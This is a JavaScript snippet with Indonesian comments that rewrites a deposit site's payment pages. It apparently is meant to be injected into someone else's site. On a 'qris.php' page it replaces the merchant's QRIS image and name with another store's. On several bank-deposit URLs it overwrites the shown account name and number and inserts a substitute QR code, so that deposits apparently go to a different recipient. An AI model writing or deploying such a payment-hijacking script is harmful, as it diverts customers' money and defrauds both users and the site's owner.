(function() {
  const url = window.location.href;

  // Fungsi untuk jalankan hanya di qris.php
  if (url.endsWith('qris.php')) {
    // Ganti URL gambar
    document.querySelectorAll('img').forEach(img => {
      if (img.src === "https://s14.gifyu.com/images/bHCtN.jpg") {
        img.src = "https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg";
      }
    });

    // Ganti value di <select>
    const metodeSelect = document.querySelector('select[name="metode"] option[selected]');
    if (metodeSelect && metodeSelect.textContent.includes("QRIS Radi Ganz")) {
      metodeSelect.textContent = "QRIS INGGAR STORE";
    }
  }

  // Fungsi untuk jalankan di url /?bank=NDk5 dll
  const bankParams = ['NDk1','NDk2','NDk3','NDk4','NDk5','NTAw','NDk0'];
  if (bankParams.some(param => url.endsWith(`/?bank=${param}`))) {
    // Nama Akun Bank
    const namaAkunInput = document.getElementById('info-copy-1');
    if (namaAkunInput) namaAkunInput.value = "Alihkan Ke Qris";

    const namaAkunSpan = document.querySelector('[data-sel="info-copy-1"] span');
    if (namaAkunSpan) namaAkunSpan.textContent = "Alihkan Ke Qris";

    // Rekening Bank No
    const rekeningInput = document.getElementById('info-copy-2');
    if (rekeningInput) rekeningInput.value = "A01 || Instan Deposit";

    const rekeningSpan = document.querySelector('[data-sel="info-copy-2"] span');
    if (rekeningSpan) rekeningSpan.textContent = "A01 || Instan Deposit";

    // Tambahkan gambar di bawah Rekening Bank No
    const rekeningContainer = rekeningInput.parentElement;
    if (rekeningContainer && !document.getElementById('custom-qris-img')) {
      const img = document.createElement('img');
      img.id = 'custom-qris-img';
      img.src = "https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg";
      img.style.maxWidth = "200px"; // Atur ukuran sesuai kebutuhan
      img.style.display = "block";
      img.style.marginTop = "10px";
      rekeningContainer.appendChild(img);
    }
  }
})();
